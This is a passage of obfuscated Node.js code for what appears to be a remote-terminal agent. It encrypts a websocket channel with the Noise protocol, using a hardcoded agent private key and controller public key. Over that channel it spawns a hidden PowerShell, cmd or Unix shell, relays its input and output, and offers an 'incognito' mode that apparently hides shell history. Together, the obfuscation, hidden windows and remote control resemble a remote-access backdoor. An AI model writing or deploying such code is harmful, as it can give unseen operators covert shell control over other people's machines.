        'zgLYBMfTzq',
        'vfbiwKC',
        'x3bHCNnLtw9Kzq',
        'r0vAAuq',
        'CgLK',
        'v3L3uu0',
        'l2fWAs90yxnRl2XVzY9JCM9U',
        'DxrMoa',
        'B25eyxrH',
        'wLzNrLa',
        'x2DLDenVBMzPz1zHBhvL',
        'uxjHyw8',
        't2HlrwO',
        'yxjNBYb0Dw5UzwWGzg9TywLUignOyw5Nzwq6ia',
        'ALjmC3u',
        'Eunyq0W',
        'Ahr0CdOVlZeYnY4WlJaUmtO',
        'thnOqLG',
        'quvtievUy3j5ChqGrxjYB3i6ieTLEsbTDxn0igjLigv4ywn0BhKGmZiGyNL0zxmGzM9YieffuY0YntyU',
        'rhPZCvu',
        'z1bLtKK',
        'z2v0tw9UDgG',
        'DKnfq1G',
        'zgvSzxrLza',
        'z2v0q3jVBKXVz3m',
        'mM9Sre9VyG',
        'l2fWAs9MAwXLl2f1DgHVCML0Eq',
        'qMP4CNu',
        'sg9ZDdOG',
        'AeLPzM4',
        'q3jLyxrPBMCGrxHWCMvZCYbHChaUlI4',
        'DuTeC2W',
        'u2vJlvDLyLnVy2TLDc1wzxjZAw9UoIaXmW',
        'v05uy3C',
        'CMvMCMvZAa',
        'ru9QuMS',
        'x3n0yxr1C19JywnOzv90Aw1L',
        'B25lqKm',
        'uwTpDKq',
        'uLjzrgu',
        'CMvNAw9Ums52mI5HCMDVDhvUBMvSlMnVBq',
        'zuzpvwm',
        'rfLireK',
        'B3jPz2LUignVBM5Ly3rPB24GDgLTzw91Da',
        'CMvTB3zLtgLZDgvUzxi',
        'zwLxC1G',
        'Aw5PDa',
        'zNLeBuy',
        '4PYfie5VAxnLioApOEAjI+wUJoAiKo+8JoERR+wiSoERR+wkOowVHUMaMUMbK+w3SUw7UUERI++8Gq',
        'CgjuzMe',
        'AxnjBML0Awf0B3i',
        'runjrvnFufvcs0vzoIdMNkRORR7NVA7NJQ/LOOpLJ5JPH4/KUjtMLOFKU7yGA2v5CY9Hz2vUDf9Ly2LLC19WDwiUyJy0ios4JEwTMowCQa',
        'l2fWAs9MAwXLl2nHDa',
        'x2rVtM9PC2viyw5KC2HHA2u',
        'DMvYAwz5',
        'BM90igfUifjqqYbYzxr1CM4GBwvZC2fNzq',
        'w0Tnt0rfxsdWN5kHios/RUATOZOG6k6+572UiokjPtGG5A2x56YM55QeieToqu1fios4LcaO5y+V6ycjksbltKfnrv9lrvKG4OMLocdLRzFNRkySios+I+wMGJOGs05btuu9BxLUyw1LieToqu1fx0Tfwt1TExnLy3jLDc1WyxnZ',
        'sgfNCK4',
        'twTxs2u',
        'B3zLCMXHEq',
        'yNvUlxb0Eq',
        'AwyTCMfUz2u',
        'C3rYzwfTia',
        'qvLjBxq',
        'uNjZDvG',
        'CMvZDa',
        '5lIn5PsV5OYb55Qe54Mi5PYSia',
        'rhvwDNC',
        'CxvPy2SGDhvUBMvSihjLCxvLC3qGD2fZihjLAMvJDgvKoIa',
        'BMHABu8',
        'C3vIyxjYyxK',
        'z2LK',
        'q1jptL9dsevds19jtLrfuLzbta',
        'zeH5ufK',
        'l2fWAs9MAwXLl3PPCa',
        'w0Tnt0rfoNnOEI5HBf0G',
        'r3rlzeG',
        'Ec10B3rHBc1JAhvUA3m',
        'uNrYCMS',
        'CNvUuhjVBwLZzq',
        'Aw52ywXPzcbXDwLJAYb0Dw5UzwWGCMvZCg9UC2u6ia',
        'Ahr0Chm6lY9HCgKUDhj5y2XVDwrMBgfYzs5JB20',
        't3rdyue',
        'BxvSDgKTC2vNBwvUDcbdyxaNBIbqCM90BYbTzxnZywDLigLZig5VDcbZDxbWB3j0zwq',
        'EgT1yNC',
        'x3jLCMvNAxn0zxi',
        'ChjVEhKTyxv0Ag9YAxPHDgLVBG',
        'ywXSB3DFCMvTB3rLx2nVBMzPzW',
        't3njB1G',
        's05btuuG5zcR6z2E5Rov5A2x56YMicJPMzdLRzFMR43MLBdLRzFLJ4OGk18Tw10Qjd1aldSVkq',
        'D3jPDgvvsw50qKu',
        'CMvWB3j0u2H6ywW',
        'uwfeAM0',
        'C2H6lMfSihjLCxvLC3qGDgLTzw91Da',
        'z2v0qwn0AxzLrwnPzxnqDwi',
        'v3jArxG',
        'qKvctLq',
        'w1rHC2TtDg9Yzv0G4P2miowUMUAxTUs7U+wkOEAbOUwKJEw8GUw4UcaO5lIn5B2X5zon5PYn5yQHktOG',
        'l2fWAs9MAwXL',
        'Ag9TzurPCG',
        'ywrK',
        'D3zYCwm',
        'yMfKihr1BM5LBcbPza',
        'AhfIweK',
        'l2fWAs9MAwXLl3vUEMLW',
        'EMDfBMC',
        'AwyTBM9Uzs1TyxrJAa',
        'DhmTBM9Kzq',
        'yLDQDxm',
        'ALLjwha',
        'l2fWAs93CY8Q',
        'sKnYzem',
        'y29UBKLUzgv4',
        'q09ovfjptf9qvujmsunFs0vz',
        'y29UDgvUDc1SB2nHDgLVBG',
        'twLNuNO',
        'Bfv4r3e',
        'ENvpyLu',
        'AwTtrMC',
        'w1rHC2TtDg9Yzv0G8j+sVIdLT7lMGAlLPi3MJihKUyxLJjBKU7VLIQe6ig9UzxrPBwu9',
        'q2nACeC',
        'Aw1Hz2uVC3zNk3HTBa',
        'B3DUzxi',
        'ls0Tls1cruDjtG',
        'C0fxq3e',
        'C2vJlxDLyNnVy2TLDc1RzxK',
        'iowWJ+AxTG',
        'z0LoyvG',
        'w1rHC2TtDg9Yzv0G8j+sVIblu1rpuKvFs0vzioACQUIUVUE9RIWG5lU75yQH5OYb5lMf5yYw5PYQ5zcV55sO',
        'zw5JCNLWDgvK',
        'y29UDgvUDc1Szw5NDgG',
        'Aw50zxjUywW',
        'CM90yxrLt3bLCMf0Aw9UywXtzwnYzxrZ',
        'Bw92zuzPBgvZ',
        't1busu9ouW',
        's05btuu',
        'CgfYyw1Z',
        'AxnjBNrLz2vY',
        'zw5Kzwq',
        'sujrvxi',
        '8j+uJcdNU4JNQ6/OV5VNQiVPGidLH7OGkenVzgu6ia',
        'BMvuq2u',
        'Aw52ywXPzcbiuefdsYbPBMrLEa',
        'w1rHC2TtDg9Yzv0G4P2mios/NEwTMowKSEI0PsaO5yAf5A2y5lU75yQH5lIn5y+x5B2X5zonktOG',
        'z2v0uMvHBhrPBwvjBMzV',
        'EgnLDvu',
        'y1zJDvO',
        'Bw9Kzq',
        'l2fWAs9HCMDV',
        'rwrWqMu',
        'wMTxzva',
        'r2HZuLy',
        'l2fWAs90zw1WA2v5',
        'C2XPy2u',
        'ufLhBK8',
        'Dhj1BMnHDgvKieHqqunlihn0CMLUzYbKyxrH',
        'D2fPDgvYCW',
        'x3zLCMLMEvDPDgG',
        'C3vIAMvJDa',
        'rfLbq08',
        'zwn4v08',
        'z2v0qxzHAwXHyMXLu2HLBgW',
        'l2fWAs9MAwXLCMf3',
        'z2v0qwn0AxzLrwnKC2fwAW',
        'vvLrBg4',
        'B2zOugW',
        'w1rHC2TtDg9Yzv0G4P2miowqR+wkQos7U+wkOEAbOUwKJEAjP+IHJow8GUw4UcaO5lIn5B2X5zon5PYn5yQHktOG',
        'CuvQvhO',
        'C2v0vgLTzw91Da',
        'mZC2CgfxDNHU',
        'zfv0CwC',
        'BgfZDe5LDhDVCMTtDgf0CW',
        'ue9nreS',
        'DKHjEKi',
        'zw5K',
        'EK9huge',
        'AwnvweK',
        'y0DuAMi',
        'CM93CW',
        'DNLOrfy',
        'zMn1sfu',
        'Exrbr0y',
        'yMfZzty0',
        'zxHWzwn0zwqGq2fWj24GuhjVDg8GC3rYDwn0ihbVAw50zxi',
        'BhHJ',
        'sK1srxK',
        'BwLU',
        'x2jHC2vPBMzVx2nHy2HL',
        'D29Yzhm',
        'y29UDgvUDa',
        'runjrvmGChvIBgLJigTLEsbUB3qGAw5PDgLHBgL6zwqSignHBM5VDcbLBMnYExb0ihjLC3bVBNnL',
        'B3PZreS',
        'u0jhr3u',
        'Chjgt1O',
        'D2vSy29Tzq',
        'ywjZ',
        'u3v0s20',
        'koACQUIUVUE9RIK',
        'q2XVDwrgBgfYzsbpCMLNAw4Gq2vYDgLMAwnHDgu',
        're5puwu',
        'DMjrsLq',
        's29tAfe',
        'z2vUzxjHDgvqywLY',
        'Ag5gt2G',
        'Ee1wCvO',
        'BwfNAwm',
        'z2f5r3y',
        'vwjYqu4',
        'teX4sMG',
        'AMDwyMy',
        'g1SZm21Bv0fstL0BwZbTia',
        'yM9KEq',
        'ANnVBG',
        'x3j1BKXVB3a',
        'uufKB0y',
        'z2v0twLUDxrLCW',
        'B1rZzKq',
        'D1LwBgW',
        'x2v4CgLYzun1CNjLBNq',
        'zxHWAxjLCW',
        'AxrLBxm',
        'DgfN',
        'zxHWCMvZCW',
        'zMLSzw5HBwu',
        'vwnpCMW',
        'y2H1BMTF',
        'zwnKC2fqDwjRzxK',
        'BwfW',
        'ExbHrg8',
        'zKzQzLG',
        'vw5JyxvNAhqGrxHJzxb0Aw9UoG',
        'D2Lkre0',
        'vvvoCKy',
        'suzms3G',
        'z3b1x25HBwu',
        'sLfpqwe',
        'l2fWAs90yxnRl2XVzY9ZDw1Tyxj5',
        'BfDAANq',
        'zw52',
        'lMjHzc0',
        'CMvHzfvjBNqXnKjf',
        'sgHMre8',
        'rvHfq19tsevmtf9nt0rf',
        'rMfPBgvKihrVihbHCNnLifvstcbMCM9T'
    ];
    a0a = function () {
        return gz;
    };
    return a0a();
}
const a0aQ = new Promise((a, b) => {
    const fk = a0aX, c = {
            'KrbYY': 'Noise\x20WASM\x20module\x20loaded\x20successfully',
            'AkbUU': function (d) {
                return d();
            },
            'DDHoc': function (d, f) {
                return d(f);
            },
            'ydPTo': fk(0x46d),
            'sTcNM': function (d) {
                return d();
            }
        };
    try {
        c[fk(0x4bd)](a0y, function (d) {
            const fl = fk;
            if (!d) {
                a0aP = new Error(fl(0x4cc)), a0D[fl(0x133)]('[WARN]\x20Noise\x20WASM\x20module\x20failed\x20to\x20load:', a0aP[fl(0x56d)]), a();
                return;
            }
            a0aO = d, a0D[fl(0x4b3)](c[fl(0x80f)]), c[fl(0x3c3)](a);
        });
    } catch (d) {
        a0aP = d, a0D[fk(0x133)](c[fk(0x259)], d[fk(0x56d)]), c[fk(0x63d)](a);
    }
});
process['on'](a0aX(0x814), (a, b) => {
    const fm = a0aX;
    a0D[fm(0x2ca)]('Unhandled\x20Promise\x20Rejection:', a);
}), process['on'](a0aX(0x75a), a => {
    const fn = a0aX;
    a0D[fn(0x2ca)](fn(0x74a), a), process[fn(0x33f)](0x1);
});
class a0aR {
    constructor(a, b, c) {
        const fo = a0aX, d = fo(0x411)['split']('|');
        let f = 0x0;
        while (!![]) {
            switch (d[f++]) {
            case '0':
                this['localPrivB64'] = b;
                continue;
            case '1':
                this['recvCipher'] = null;
                continue;
            case '2':
                this[fo(0x8a7)] = ![];
                continue;
            case '3':
                this['hs'] = null;
                continue;
            case '4':
                this[fo(0x79f)] = null;
                continue;
            case '5':
                this[fo(0x696)] = a;
                continue;
            case '6':
                this['expectedRemotePubB64'] = c;
                continue;
            }
            break;
        }
    }
    async [a0aX(0x692)]() {
        const fp = a0aX, a = {
                'EZGAF': fp(0x4a4),
                'oWNYd': fp(0x71a)
            };
        await a0aQ;
        if (!a0aO)
            throw a0aP || new Error('Noise\x20WASM\x20module\x20not\x20available');
        const b = a0aO, c = this['isInitiator'] ? b['constants'][fp(0x250)] : b[fp(0x586)]['NOISE_ROLE_RESPONDER'];
        this['hs'] = b[fp(0x2ce)](a[fp(0x3c2)], c);
        const d = Buffer[fp(0x3a5)]('kisama_terminal_v1'), f = this['localPrivB64'] ? Buffer[fp(0x3a5)](this[fp(0x4ff)], a[fp(0x17f)]) : null, g = this[fp(0x84a)] ? Buffer[fp(0x3a5)](this[fp(0x84a)], a[fp(0x17f)]) : null;
        this['hs']['Initialize'](d, f, g, null);
    }
    [a0aX(0x215)](a) {
        const fq = a0aX, b = {
                'jEQqL': function (d, f) {
                    return d > f;
                },
                'kzloA': function (d, f) {
                    return d === f;
                },
                'xuqVc': function (d, f) {
                    return d === f;
                }
            };
        if (this[fq(0x8a7)])
            return Buffer[fq(0x252)](0x0);
        const c = a0aO;
        a && b[fq(0x4fb)](a[fq(0x38d)], 0x0) && b['kzloA'](this['hs']['GetAction'](), c['constants'][fq(0x52c)]) && this['hs'][fq(0x26b)](a);
        if (b[fq(0x277)](this['hs'][fq(0x5cd)](), c[fq(0x586)][fq(0x655)]))
            return this['_splitAndFinish'](), Buffer[fq(0x252)](0x0);
        if (b[fq(0x277)](this['hs'][fq(0x5cd)](), c[fq(0x586)][fq(0x4a9)])) {
            const d = this['hs']['WriteMessage'](new Uint8Array(0x0));
            return b[fq(0x3cc)](this['hs']['GetAction'](), c[fq(0x586)][fq(0x655)]) && this[fq(0x64d)](), Buffer[fq(0x3a5)](d);
        }
        return Buffer[fq(0x252)](0x0);
    }
    ['_splitAndFinish']() {
        const fr = a0aX, a = {
                'BbNMb': function (g, h) {
                    return g && h;
                },
                'yhaVM': fr(0x50b)
            };
        let b = null;
        try {
            b = this['hs'][fr(0x3d1)]();
        } catch (g) {
            b = null;
        }
        const c = this[fr(0x84a)] ? Buffer[fr(0x3a5)](this[fr(0x84a)], 'base64') : null, d = a['BbNMb'](b, c) && b['length'] === c[fr(0x38d)] && a0k[fr(0x587)](Buffer['from'](b), c);
        if (!d)
            throw new Error(a[fr(0x4c1)]);
        const f = this['hs']['Split']();
        this[fr(0x79f)] = f[0x0], this['recvCipher'] = f[0x1], this[fr(0x8a7)] = !![];
        try {
            if (this['hs'])
                this['hs'][fr(0x1d2)]();
        } catch (h) {
        }
        this['hs'] = null;
    }
    ['encrypt'](a) {
        const ft = a0aX, b = { 'DfPEn': ft(0x650) };
        if (!this['handshakeFinished'])
            throw new Error(b[ft(0x8ab)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer[ft(0x3a5)](this[ft(0x79f)][ft(0x4a5)](c, d));
    }
    [a0aX(0x257)](a) {
        const fu = a0aX, b = { 'KKudV': fu(0x2a2) };
        if (!this[fu(0x8a7)])
            throw new Error(b[fu(0x18e)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer[fu(0x3a5)](this[fu(0x3dc)]['DecryptWithAd'](c, d));
    }
    [a0aX(0x1d2)]() {
        const fv = a0aX, a = { 'yjkbJ': fv(0x3cd) }, b = a[fv(0x4d2)][fv(0x622)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[fv(0x79f)] = null;
                continue;
            case '1':
                try {
                    if (this['hs'])
                        this['hs'][fv(0x1d2)]();
                } catch (d) {
                }
                continue;
            case '2':
                this[fv(0x3dc)] = null;
                continue;
            case '3':
                try {
                    if (this[fv(0x3dc)])
                        this['recvCipher']['free']();
                } catch (f) {
                }
                continue;
            case '4':
                this['hs'] = null;
                continue;
            case '5':
                try {
                    if (this[fv(0x79f)])
                        this[fv(0x79f)]['free']();
                } catch (g) {
                }
                continue;
            }
            break;
        }
    }
}
class a0aS {
    constructor(a, b, c, d) {
        const fw = a0aX, f = { 'DjmSR': fw(0x841) }, g = f[fw(0x5f2)][fw(0x622)]('|');
        let h = 0x0;
        while (!![]) {
            switch (g[h++]) {
            case '0':
                this[fw(0x752)] = b;
                continue;
            case '1':
                this['_onExitCb'] = null;
                continue;
            case '2':
                this[fw(0x60e)] = c;
                continue;
            case '3':
                this['proc'] = null;
                continue;
            case '4':
                this[fw(0x668)] = 0x0;
                continue;
            case '5':
                this[fw(0x887)] = a;
                continue;
            case '6':
                this[fw(0x4a0)] = d || [];
                continue;
            case '7':
                this[fw(0x795)] = null;
                continue;
            }
            break;
        }
    }
    [a0aX(0x87e)]() {
        const fx = a0aX, a = {
                'mHEvo': function (c, d, f, g) {
                    return c(d, f, g);
                },
                'Vbzuf': fx(0x2b2),
                'BWvSD': fx(0x138),
                'JGRTC': fx(0x33f)
            };
        this[fx(0x245)] = a[fx(0x35d)](a0s, this[fx(0x887)], this[fx(0x4a0)], {
            'env': this[fx(0x752)],
            'cwd': this[fx(0x60e)],
            'windowsHide': !![],
            'stdio': [
                fx(0x2b2),
                a[fx(0x65b)],
                a['Vbzuf']
            ]
        }), this[fx(0x668)] = this[fx(0x245)][fx(0x668)] || 0x0;
        const b = this;
        this['proc'][fx(0x831)]['on'](a[fx(0x30b)], c => b[fx(0x223)](c)), this[fx(0x245)][fx(0x557)]['on'](a[fx(0x30b)], c => b[fx(0x223)](c)), this[fx(0x245)]['on'](a[fx(0x36e)], (c, d) => {
            const fy = fx;
            if (b['_onExitCb'])
                b[fy(0x159)]({
                    'exitCode': c,
                    'signal': d || null
                });
        });
    }
    [a0aX(0x223)](a) {
        const fz = a0aX, b = { 'DNOQe': fz(0x5ef) };
        if (this[fz(0x795)])
            this[fz(0x795)](a[fz(0x562)](b[fz(0x72b)]));
    }
    [a0aX(0x66c)](a) {
        return this['_onDataCb'] = a, {
            'dispose': () => {
                const fA = a0b;
                this[fA(0x795)] = null;
            }
        };
    }
    ['onExit'](a) {
        const fB = a0aX;
        return this[fB(0x159)] = a, {
            'dispose': () => {
                this['_onExitCb'] = null;
            }
        };
    }
    ['write'](a) {
        const fC = a0aX;
        if (!this['proc'] || !this['proc'][fC(0x2be)])
            return;
        try {
            this[fC(0x245)]['stdin']['write'](a);
        } catch (b) {
        }
    }
    ['resize']() {
    }
    ['kill']() {
        const fD = a0aX;
        try {
            if (this['proc'])
                this[fD(0x245)]['kill']();
        } catch (a) {
        }
    }
}
class a0aT {
    constructor() {
        const fE = a0aX, a = { 'TBAnV': 'handshake' };
        this['ptyProcess'] = null, this[fE(0x7c0)] = null, this[fE(0x2c3)] = null, this['useNoise'] = !![], this[fE(0x1e3)] = ![], this[fE(0x2a9)] = ![], this[fE(0x1c2)] = a['TBAnV'], this[fE(0x554)] = [], this['msgResolvers'] = [], this['AGENT_PRIVATE_KEY'] = a0P[fE(0x83a)][fE(0x426)][fE(0x82b)], this['CONTROL_PUBLIC_KEY'] = a0P[fE(0x83a)][fE(0x1c5)][fE(0x3ed)], this[fE(0x4d7)] = new a0aR(![], this[fE(0x352)], this[fE(0x6d5)]);
    }
    async [a0aX(0x815)]() {
        const fF = a0aX, a = {
                'FOHUj': function (b, c) {
                    return b === c;
                }
            };
        this[fF(0x2c3)] && a0D[fF(0x604)]('[' + this['requestId'] + fF(0x11e));
        if (this[fF(0x583)]) {
            a[fF(0x7aa)](process[fF(0x56f)], fF(0x316)) && this[fF(0x583)][fF(0x668)] && this[fF(0x1b2)](this[fF(0x583)]['pid']);
            try {
                this[fF(0x583)]['kill']();
            } catch (b) {
            }
            this['ptyProcess'] = null;
        }
        if (this[fF(0x4d7)])
            this[fF(0x4d7)][fF(0x1d2)]();
        if (this[fF(0x7c0)])
            try {
                a[fF(0x7aa)](this[fF(0x7c0)]['readyState'], this['websocket'][fF(0x27a)]) && this[fF(0x7c0)][fF(0x5a2)](0x3e8, 'Cleanly\x20closed');
            } catch (c) {
            } finally {
                this['websocket'] = null;
            }
    }
    [a0aX(0x1b2)](a) {
        const fG = a0aX, b = {
                'obuWq': function (c, d, f, g) {
                    return c(d, f, g);
                }
            };
        try {
            b[fG(0x1a5)](a0r, fG(0x20e) + a, { 'windowsHide': !![] }, () => {
            });
        } catch (c) {
        }
    }
    [a0aX(0x23b)](a) {
        const fH = a0aX, b = {
                'rHAcA': fH(0x5b5),
                'RKaiz': function (c, d) {
                    return c > d;
                },
                'tVcbn': function (c, d) {
                    return c(d);
                },
                'dxMTV': function (c, d) {
                    return c === d;
                },
                'cKQoJ': fH(0x631)
            };
        if (this[fH(0x1c2)] === b['rHAcA']) {
            if (b[fH(0x5db)](this[fH(0x7fd)][fH(0x38d)], 0x0)) {
                const c = this[fH(0x7fd)][fH(0x513)]();
                b['tVcbn'](c, a);
            } else
                this['msgQueue'][fH(0x4a7)](a);
        } else
            b[fH(0x439)](this[fH(0x1c2)], b[fH(0x4be)]) && this[fH(0x617)](a);
    }
    async [a0aX(0x44c)]() {
        const fI = a0aX, a = {
                'JcSXo': function (b, c) {
                    return b > c;
                }
            };
        if (a['JcSXo'](this['msgQueue']['length'], 0x0))
            return this[fI(0x554)]['shift']();
        return new Promise(b => {
            const fJ = fI;
            this['msgResolvers'][fJ(0x4a7)](b);
        });
    }
    async [a0aX(0x699)](a) {
        const fK = a0aX, b = {
                'OYqRR': function (c, d) {
                    return c(d);
                },
                'aMzXK': fK(0x4f6),
                'UeEFl': function (c, d) {
                    return c(d);
                },
                'QkOvD': fK(0x694),
                'zIesL': function (c, d) {
                    return c(d);
                },
                'pijWM': fK(0x55b)
            };
        b[fK(0x3fc)](a, '🤝\x20开始\x20Noise\x20加密握手...');
        try {
            await this['cipher']['init']();
            const c = await this[fK(0x44c)](), d = this[fK(0x4d7)][fK(0x215)](c);
            d && d[fK(0x38d)] > 0x0 && this[fK(0x7c0)][fK(0x580)](d);
            const f = await this[fK(0x44c)]();
            this['cipher']['processHandshake'](f);
            if (!this[fK(0x4d7)][fK(0x8a7)])
                throw new Error(b[fK(0x75f)]);
            b[fK(0x3bd)](a, b[fK(0x68a)]);
        } catch (g) {
            b['zIesL'](a, '💥\x20握手失败详情:\x20' + g['message']);
            throw new Error(b['pijWM']);
        }
    }
    [a0aX(0x705)]() {
        const fL = a0aX, a = {
                'kSmxg': function (d, f) {
                    return d === f;
                },
                'NGTgz': 'C:\x5cWindows',
                'STiqA': fL(0x1c3),
                'jHkHa': fL(0x1b5),
                'CJohk': 'cmd.exe',
                'XoNTd': fL(0x47d),
                'uUHff': fL(0x36c),
                'niUNL': fL(0x28a)
            };
        if (a['kSmxg'](process['platform'], fL(0x316))) {
            const d = process.env.SystemRoot || a['NGTgz'], f = [
                    a0o[fL(0x344)](d, a[fL(0x36a)], a[fL(0x59c)], 'v1.0', fL(0x7b9)),
                    process.env.COMSPEC,
                    a0o[fL(0x344)](d, a[fL(0x36a)], fL(0x7f9))
                ];
            for (const g of f) {
                if (g && a0l['existsSync'](g))
                    return g;
            }
            return a[fL(0x18a)];
        }
        const b = [
            fL(0x2a7),
            a[fL(0x566)],
            a[fL(0x331)]
        ];
        for (const h of b) {
            if (a0l['existsSync'](h))
                return h;
        }
        const c = process.env.SHELL;
        if (c && a0l[fL(0x83e)](c))
            return c;
        return a['niUNL'];
    }
    async [a0aX(0x7db)](a, b, c, d = ![], f = ![]) {
        const fM = a0aX, g = {
                'blXde': function (i, j) {
                    return i(j);
                },
                'ZrcdE': fM(0x43e),
                'KoagD': fM(0x56d)
            };
        this[fM(0x7c0)] = a, this['requestId'] = b, this['metaRequested'] = d, this[fM(0x2a9)] = f;
        const h = i => a0D['info'](fM(0x7e8) + b + ']\x20' + i);
        this[fM(0x4ba)] = !c, g[fM(0x239)](h, this[fM(0x4ba)] ? fM(0x525) : g[fM(0x77a)]), a['on'](g[fM(0x3ce)], i => this[fM(0x23b)](i));
        try {
            this['useNoise'] && await this['_doNoiseHandshake'](h), await this['_runTerminal'](h);
        } catch (i) {
            h(fM(0x817) + i['message']), await this['cleanup']();
        }
    }
    async [a0aX(0x519)](a) {
        const fN = a0aX, b = {
                'zXawS': fN(0x5ef),
                'FzDaI': function (h, i) {
                    return h === i;
                },
                'WiDeF': function (h, i) {
                    return h(i);
                },
                'JFYDd': '🔌\x20客户端主动断开',
                'cJRvh': function (h, i) {
                    return h(i);
                },
                'UFurK': 'xterm-256color',
                'FvppL': function (h, i) {
                    return h !== i;
                },
                'PYGnO': fN(0x316),
                'EfSum': function (h, i) {
                    return h === i;
                },
                'ADbRZ': fN(0x7b9),
                'ekGQM': fN(0x258),
                'lPArb': fN(0x149),
                'uxtTh': fN(0x1a0),
                'iVqdO': function (h) {
                    return h();
                },
                'DjNAE': function (h, i) {
                    return h(i);
                },
                'LyLSM': 'unknown',
                'ERSLw': fN(0x631),
                'ZMGdh': function (h, i) {
                    return h > i;
                },
                'bDvWC': fN(0x5a2)
            }, c = this[fN(0x705)]();
        b[fN(0x8a8)](a, '🐚\x20使用\x20Shell\x20路径:\x20' + c);
        const d = Object[fN(0x512)]({}, process.env);
        delete d[fN(0x86a)], d[fN(0x4de)] = b[fN(0x7b6)];
        if (!d[fN(0x244)])
            d[fN(0x244)] = fN(0x240);
        this['incognitoRequested'] && b[fN(0x309)](process['platform'], b['PYGnO']) && (d[fN(0x44e)] = fN(0x875));
        const f = this[fN(0x2a9)] && b[fN(0x196)](process['platform'], fN(0x316)) && b[fN(0x196)](a0o[fN(0x347)](c)[fN(0x118)](), b[fN(0x5c5)]) ? [
                b[fN(0x766)],
                b[fN(0x7c7)],
                b[fN(0x20a)]
            ] : [], g = b[fN(0x5d0)](a0E);
        try {
            const h = {
                'name': b[fN(0x7b6)],
                'cols': 0x50,
                'rows': 0x18,
                'cwd': g,
                'env': d
            };
            if (process[fN(0x56f)] === b[fN(0x6fe)])
                try {
                    this['ptyProcess'] = a0C['spawn'](c, f, h);
                } catch (i) {
                    b['DjNAE'](a, '⚠️\x20ConPTY\x20启动失败，回退管道模式:\x20' + i['message']), this[fN(0x583)] = new a0aS(c, d, g, f), this[fN(0x583)]['spawn']();
                }
            else
                this[fN(0x583)] = a0C[fN(0x87e)](c, f, h);
            b[fN(0x649)](a, fN(0x84b) + (this[fN(0x583)][fN(0x668)] || b[fN(0x65d)]) + ')');
            this[fN(0x1e3)] && this[fN(0x80e)](c);
            this[fN(0x1c2)] = b[fN(0x528)];
            while (b[fN(0x218)](this[fN(0x554)][fN(0x38d)], 0x0)) {
                const j = this['msgQueue'][fN(0x513)]();
                this[fN(0x617)](j);
            }
            this[fN(0x583)]['onData'](k => {
                const fO = fN;
                try {
                    let l = Buffer[fO(0x3a5)](k, b[fO(0x8a4)]);
                    this[fO(0x4ba)] && this[fO(0x4d7)] && this[fO(0x4d7)]['handshakeFinished'] && (l = this['cipher'][fO(0x3f4)](l)), b[fO(0x55a)](this[fO(0x7c0)][fO(0x2bb)], 0x1) && this[fO(0x7c0)]['send'](l);
                } catch (m) {
                }
            }), this['ptyProcess']['onExit'](({
                exitCode: k,
                signal: l
            }) => {
                const fP = fN;
                a(fP(0x6f0) + k + fP(0x319) + l + ')'), this[fP(0x815)]();
            }), this[fN(0x7c0)]['on'](b[fN(0x809)], () => {
                const fQ = fN;
                b[fQ(0x43a)](a, b[fQ(0x4d3)]), this[fQ(0x815)]();
            });
        } catch (k) {
            b[fN(0x8a8)](a, fN(0x7c4) + k[fN(0x56d)]), await this[fN(0x815)]();
            throw k;
        }
    }
    static [a0aX(0x3c8)](a) {
        const fR = a0aX, b = {
                'RiGWY': function (d, f) {
                    return d(f);
                },
                'NoZYN': function (d, f) {
                    return d || f;
                }
            };
        let c = a0o[fR(0x347)](b[fR(0x249)](String, b[fR(0x30d)](a, ''))[fR(0x1c8)]())[fR(0x118)]();
        if (c[fR(0x3e1)](fR(0x54e)))
            c = c[fR(0x6fd)](0x0, -0x4);
        return c || 'sh';
    }
    static [a0aX(0x5ff)](a) {
        const fS = a0aX, b = {
                'aKhMJ': function (c, d) {
                    return c === d;
                },
                'SoefS': fS(0x316),
                'RRSJI': function (c, d) {
                    return c(d);
                },
                'aLwCD': function (c, d) {
                    return c || d;
                },
                'AoHpX': fS(0x7f9)
            };
        if (b['aKhMJ'](process['platform'], b[fS(0x2d2)])) {
            const c = a0o[fS(0x347)](b[fS(0x22d)](String, b[fS(0x79d)](a, '')))[fS(0x118)]();
            return c === fS(0x7b9) || c === b[fS(0x28e)];
        }
        return !![];
    }
    ['_sendWelcome'](a) {
        const fT = a0aX, b = {
                'lXRlF': function (c, d) {
                    return c === d;
                }
            };
        try {
            let c = Buffer['from'](JSON[fT(0x7cb)]({
                'type': fT(0x726),
                'shell': a0aT['normalizeShellName'](a),
                'path': a,
                'incognito': !!(this['incognitoRequested'] && a0aT['incognitoNativeApplied'](a))
            }));
            this[fT(0x4ba)] && this['cipher'] && this[fT(0x4d7)]['handshakeFinished'] && (c = this['cipher'][fT(0x3f4)](c)), this['websocket'] && b[fT(0x251)](this['websocket'][fT(0x2bb)], 0x1) && this['websocket'][fT(0x580)](c);
        } catch (d) {
        }
    }
    [a0aX(0x617)](a) {
        const fU = a0aX, b = {
                'rXcfS': fU(0x5ef),
                'ofhPl': 'heartbeat',
                'VTnYD': fU(0x511),
                'stfXZ': fU(0x19a),
                'DNldJ': function (c, d) {
                    return c !== d;
                },
                'jeVNA': function (c, d) {
                    return c === d;
                },
                'iSXTB': 'base64'
            };
        if (!this['ptyProcess'])
            return;
        try {
            const c = Buffer[fU(0x3a5)](a);
            let d;
            this['useNoise'] ? d = this[fU(0x4d7)]['decrypt'](c) : d = c;
            let f = ![], g = d[fU(0x562)](b[fU(0x771)]);
            if (g[fU(0x1c8)]()[fU(0x1f5)]('{'))
                try {
                    const h = JSON[fU(0x1ef)](g);
                    f = !![];
                    if (h[fU(0x40e)] === b[fU(0x709)]) {
                        let i = Buffer[fU(0x3a5)](JSON['stringify']({ 'type': fU(0x8a6) }));
                        if (this['useNoise'])
                            i = this[fU(0x4d7)][fU(0x3f4)](i);
                        this['websocket'][fU(0x580)](i);
                        return;
                    }
                    if (h[fU(0x40e)] === b[fU(0x2af)]) {
                        this[fU(0x583)]['resize'](h[fU(0x333)] || 0x50, h[fU(0x716)] || 0x18);
                        return;
                    }
                    if (h[fU(0x40e)] === b[fU(0x3b4)] && b[fU(0x227)](h[fU(0x138)], undefined)) {
                        let j = b['jeVNA'](h[fU(0x354)], b[fU(0x629)]) ? Buffer[fU(0x3a5)](h[fU(0x138)], b[fU(0x629)])[fU(0x562)](b[fU(0x771)]) : h[fU(0x138)];
                        this[fU(0x583)][fU(0x462)](j);
                        return;
                    }
